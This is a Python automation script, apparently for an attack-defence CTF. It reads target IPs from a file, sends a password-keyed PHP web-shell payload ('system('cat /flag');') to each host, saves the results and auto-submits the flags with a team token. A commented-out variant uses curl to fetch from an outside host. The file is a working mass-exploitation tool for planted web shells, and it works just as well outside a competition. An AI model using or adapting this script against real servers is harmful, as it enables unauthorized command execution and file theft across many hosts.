#!/usr/bin/python3
import requests
def getFlag(shell_url):
    try:
        res=requests.post(shell_url,payload,timeout=1)
        if res.status_code == 200:
            result = shell_url + " connect shell sucess,flag is "+res.text
            print(result)
            flag.write(res.text+'\n')
        else:
            print("Shell 404")
    except:
        print(shell_url + " connect shell fail")

def submit_Flag(flag_url):
    try:
        res=requests.post(flag_url,data,timeout=1)
        if res.status_code == 200:
            print("submit flag success--")
        else:
            print("submit flag fail")
    except:
        print(flag_url + " connect fail")

if __name__ == '__main__':
    print("该脚本功能实现开场第一波flag的获取，并自动提交flag")
    file = open('ip.txt','r')
    url_head = file.readlines()
    flag=open("firstround_flag.txt","w")
    print("[+] 请输入shell地址Input example:/footer.php")
    shell_addr = input()
    print("[+] 请输入木马密码Input example：shell")
    passwd = input("")
    payload =  {passwd: "system('cat /flag');"}
    #payload =  {passwd: 'system(\'curl http://flag.host/getflag.php\');'}#需修改
    #payload =  {passwd: 'cat /flag'}
    for i in url_head:
        shell_url = i.strip()+shell_addr
        getFlag(shell_url)
    flag.close()
    flag_server = input("[+] 请输入提交flag的网址Input example:http://192.168.194.147:9090/\n")
    token = input("[+] 请输入自己队伍的token：")
    first_flag = open('firstround_flag.txt',"r")
    first_flag_list = first_flag.readlines()
    for j in first_flag_list:
        data = {
                'flag':j.strip(),
                'token':token
        }
        submit_Flag(flag_server)